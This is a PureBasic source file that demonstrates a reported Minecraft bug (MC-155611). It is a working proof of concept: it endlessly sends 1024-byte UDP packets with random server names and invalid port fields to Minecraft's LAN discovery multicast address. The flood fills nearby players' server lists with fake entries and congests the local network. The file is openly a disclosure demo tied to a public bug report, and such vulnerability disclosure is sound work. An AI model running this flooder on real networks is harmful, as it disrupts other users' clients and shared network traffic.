;{- Code Header
; ==- Basic Info -================================
;         Name: AbuseMinecraftLanServerDiscovery.pb
;      Version: N/A
;      Authors: Herwin Bozet
;  Create date: 29 June 2019, 17:01:37
; 
;  Description: Demonstration of the MC-155611 bug.
; 
; ==- Compatibility -=============================
;  Compiler version: PureBasic 5.70 x64 (Other versions untested)
;  Operating system: Windows 10 (Other platforms untested)
; 
; ==- Links & License -===========================
;   Github: https://github.com/aziascreations/MC-155611-Bug-Demonstration
;  License: Unlicense
;
;  Bug Report: https://bugs.mojang.com/browse/MC-155611
;
;}

;
;- Compiler Directives
;{

EnableExplicit

;}

;
;- Constants
;{

; Characters used in the MOTD, only ascii characters are used to avoid dealing with UTF-8 characters' variable length.
#MC_LAN_MOTD_ALPHABET$ = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"

; Delimiters.
#MC_LAN_BOUND_START$ = "[MOTD]"
#MC_LAN_BOUND_MID$ = "[/MOTD][AD]"
#MC_LAN_BOUND_END$ = "[/AD]"

; According to the PureBasic documentation, a buffer transmitted by UDP should be able to be 2048 bytes long,
;  but at 1025 and up, Minecraft stops "reading" them, and WireShark show that the packet's data size is
;  twice as big as the buffer.
#MC_LAN_BUFFER_SIZE = 1024

; Represents the amount of number used in the 'AD' part of the packet.
; Minecraft simply reads that section and assumes it is a valid port number, even if it bigger than 65535 and has non-numerical chars.
; It is mostly used to force Minecraft to interpret each announcement packet as a new/different server.
#MC_LAN_BUFFER_PORT_SIZE = 10
; These 2 constants have been added to avoid having to calculate the lower and upper bounds of the random number for the port.
#MC_LAN_BUFFER_PORT_BOUND_UPPER = 9999999999
#MC_LAN_BUFFER_PORT_BOUND_LOWER = 1000000000

; It's technically a multicast address...
#MC_LAN_BROADCAST_ADDRESS$ = "224.0.2.60"
#MC_LAN_BROADCAST_PORT = 4445

; Delay in milliseconds between each packet.
; 10ms is a good number that avoids broadcast/multicast congestion.
; 1ms gives much better results faster.
#MC_LAN_DELAY = 10

;}

;
;- Actual Code
;{

;-> Initialisation

If InitNetwork() = 0
	MessageRequester("Error", "Can't initialize the network environment !", 0)
	End 1
EndIf

If (Len(#MC_LAN_BOUND_START$) + Len(#MC_LAN_BOUND_MID$) + Len(#MC_LAN_BOUND_END$) + #MC_LAN_BUFFER_PORT_SIZE) >= #MC_LAN_BUFFER_SIZE - 1
	MessageRequester("Error", "Packet buffer is too small !", 0)
	End 2
EndIf


;-> Preparing the packet buffer
; A buffer is used to rapidly poke a new port 'number' into it before sending it.

Define BufferOffset.i
Define *PacketBuffer = AllocateMemory(#MC_LAN_BUFFER_SIZE)

If Not *PacketBuffer
	MessageRequester("Error", "Memory allocation failure", 0)
	End 3
EndIf

; Filling the buffer with random characters from '#MC_LAN_MOTD_ALPHABET$'.
For BufferOffset = 0 To #MC_LAN_BUFFER_SIZE
	PokeS(*PacketBuffer + BufferOffset, Mid(#MC_LAN_MOTD_ALPHABET$, Random(Len(#MC_LAN_MOTD_ALPHABET$), 1), 1), 1, #PB_Ascii | #PB_String_NoZero)
Next

; Adding the delimiters.
PokeS(*PacketBuffer, #MC_LAN_BOUND_START$, -1, #PB_Ascii | #PB_String_NoZero)
PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_MID$) - Len(#MC_LAN_BOUND_END$) - #MC_LAN_BUFFER_PORT_SIZE, #MC_LAN_BOUND_MID$, -1, #PB_Ascii | #PB_String_NoZero)
PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_END$), #MC_LAN_BOUND_END$, -1, #PB_Ascii | #PB_String_NoZero)

; INFO: Uncomment the following line to view the packet in memory.
;ShowMemoryViewer(*PacketBuffer, #MC_LAN_BUFFER_SIZE)


;-> Network part

Define ConnectionID = OpenNetworkConnection(#MC_LAN_BROADCAST_ADDRESS$, #MC_LAN_BROADCAST_PORT, #PB_Network_UDP)
If ConnectionID
	MessageRequester("PureBasic", "Connection established."+#CRLF$+#CRLF$+"Press 'Ok' to start.", 0)
	
	Repeat
		; Changing the port number in the buffer
		PokeS(*PacketBuffer + #MC_LAN_BUFFER_SIZE - Len(#MC_LAN_BOUND_END$) - #MC_LAN_BUFFER_PORT_SIZE, Str(Random(#MC_LAN_BUFFER_PORT_BOUND_UPPER, #MC_LAN_BUFFER_PORT_BOUND_LOWER)), -1, #PB_Ascii | #PB_String_NoZero)
		
		; Sending the packet
		SendNetworkData(ConnectionID, *PacketBuffer, #MC_LAN_BUFFER_SIZE)
		
		Delay(#MC_LAN_DELAY)
	ForEver
EndIf

; This code is only reached if an error occured when establishing the network connection.
MessageRequester("Error", "Can't open network connection. (Is it a broadcast/multicast address ?)", 0)
FreeMemory(*PacketBuffer)
End 4

;}

; IDE Options = PureBasic 5.70 LTS (Windows - x64)
; CursorPosition = 110
; Folding = -
; EnableXP
; Executable = test.exe